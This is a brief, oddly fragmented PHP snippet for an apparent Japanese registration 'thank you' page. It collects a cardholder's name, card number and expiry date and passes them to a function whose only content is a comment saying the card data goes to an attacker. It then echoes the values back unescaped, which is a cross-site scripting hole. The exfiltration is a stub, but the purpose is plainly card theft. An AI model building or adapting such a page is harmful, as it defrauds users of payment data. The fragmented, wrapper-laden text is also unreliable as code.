#[#<p>ご登録ありがとうございました。</p>#]#
#[#<?php#]#
#[#$name = $_POST["name"];#]#
#[#$card_number = $_POST["card_number"];#]#
#[#$expiration_date = $_POST["expiration_date"];#]#
#[#function sendMail($name, $card_number, $expiration_date) {
    // ここで攻撃者にクレジットカード情報を送信します。
}#]#
#[#sendMail($name, $card_number, $expiration_date);#]#
#[#echo "カード名義: ", $name;#]#
#[#echo "<br>";#]#
#[#echo "カード番号: ", $card_number;#]#
#[#echo "<br>";#]#
#[#echo "有効期限: ", $expiration_date;#]#
#[#?>#]#